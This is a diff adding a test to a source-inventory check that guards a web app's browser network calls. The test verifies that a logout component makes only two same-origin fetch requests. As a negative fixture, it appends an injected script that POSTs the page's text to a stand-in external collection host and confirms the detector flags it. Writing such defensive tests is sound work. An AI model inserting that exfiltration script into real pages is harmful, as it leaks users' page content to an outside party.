@@ -63,6 +63,22 @@ describe("#348 fail-closed source inventory", () => {
     expect(transportFingerprintFailure(path, changed)).toBe(`CHANGED_BROWSER_TRANSPORT:${path}`);
   });
 
+  it("reviews the #328 logout confirmation without granting any new transport surface", () => {
+    const path = "src/components/account/AccountChip.astro";
+    const reviewed = source(path);
+    expect((reviewed.match(/\bfetch\s*\(/gu) ?? []).length).toBe(2);
+    expect(reviewed).toContain('fetch("/api/auth/session", { credentials: "same-origin"');
+    expect(reviewed).toContain('fetch("/api/auth/logout", { method: "POST", credentials: "same-origin"');
+    expect(reviewed).toContain('if (response.status !== 204) throw new Error(');
+    expect(transportFingerprintFailure(path, reviewed)).toBeNull();
+    for (const altered of [
+      reviewed.replace('fetch("/api/auth/logout"', 'fetch("/api/hidden-upload"'),
+      reviewed + '\n<script>fetch("https://example.invalid/collect", {method:"POST",body:document.body.textContent});</script>',
+    ]) {
+      expect(transportFingerprintFailure(path, altered)).toBe(`CHANGED_BROWSER_TRANSPORT:${path}`);
+    }
+  });
+
   it("rejects new browser endpoints through fetch, beacon, XHR and dynamic bracket access", () => {
     const path = "src/components/tools/NewUploader.tsx";
     for (const injected of [
